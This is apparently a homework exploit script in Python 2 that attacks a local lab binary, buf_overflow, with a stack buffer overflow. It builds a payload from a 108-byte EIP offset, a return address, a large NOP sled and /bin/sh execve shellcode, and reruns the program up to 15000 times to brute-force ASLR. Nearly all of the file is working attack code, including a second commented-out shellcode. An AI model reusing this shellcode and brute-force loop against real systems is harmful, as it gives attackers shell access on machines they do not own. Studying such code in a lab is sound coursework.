#!/usr/bin/python2
import os
import sys

# NOTE: fill in the '?' n the two lines below with the values you discover in 
# the HW writeup steps 2 and 4. Be careful NOT to use the value "\x00", because
# "\x00" is equivalent to the NULL character, so the exploit buffer will not be
# written past this byte when using strcpy().
#
# We also need to watch out for characters which have a special interpretation
# on the command line, for example the value "\x60" is the '`' (back-tick) 
# character), "\x21" is '!', "\x22" is '"', "\x24" is '$', "\x27" is ''' and
# "\2a" is '*'.  Each of these characters may have an undesireable effect on
# the command line we are executing with the os.system() call below.

eipOffset     = 108                       # EIP offset
RandomAddress = '\x50\xb9\xc6\xff'#'\xff\xc6\xb9\x50' #'\x50\xb9\xc6\xff'  '\x??\x??\x??\x??'        # address from printESP
nopSleds      = 10000 #20480                     # Large number of NOP sleds

# the /bin/sh shellcode
shellcode     = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
#shellcode = '\x80\xfb\x65\x74\x06\x31\xdb\xb3\x65\xeb\x03\x5f\xeb\x05\xe8\xed\xff\xff\xff\xeb\x5b\x2d\x6d\x69\x6e\x67\x6c\x65\x76\x65\x6c\x2d\x72\x65\x72\x61\x6d\x2d\x69\x6d\x6d\x79\x2d\x6c\x6f\x77\x2d\x74\x61\x6c\x65\x6e\x74\x70\x72\x6f\x67\x2d\x43\x59\x33\x33\x32\x30\x2d\x70\x72\x6f\x76\x69\x6e\x67\x2d\x2d\x2d\x2d\x54\x0b\x10\x2c\x13\x16\x34\x05\x2c\x23\x0d\x01\x19\x35\x07\x02\x03\x08\x03\x03\x01\x06\x03\x01\x03\x04\x07\x01\x2d\x43\x26\x41\x73\x6d\x2d\x61\x8d\x7f\x02\x31\xc0\xb0\x01\x89\xc6\x4e\x83\xfe\x0e\x74\x18\xb0\x04\xb3\x01\x31\xc9\x8a\x4c\x37\x37\x8d\x0c\x0f\x31\xd2\x8a\x54\x37\x45\xcd\x80\x46\xeb\xe3\x89\xc3\xb0\x01\xcd\x80'

# the exploit payload
exploit = ('A' * eipOffset) + RandomAddress + ('\x90' * nopSleds) + shellcode

i  = 1                                               # trial counter
rc = 1
while i <= 15000 and rc != 0:                         # continue until success
   print("BruteForce ASLR Trial Number " + str(i))    # print the number of trial
   rc = os.system("./buf_overflow "+exploit+' null') # execute the program
   if rc != 0:
       print("Trial " + str(i) + " failed")
   else:
       print("Trial " + str(i) + " succeeded")
   i = i + 1                                         # increment the trial count
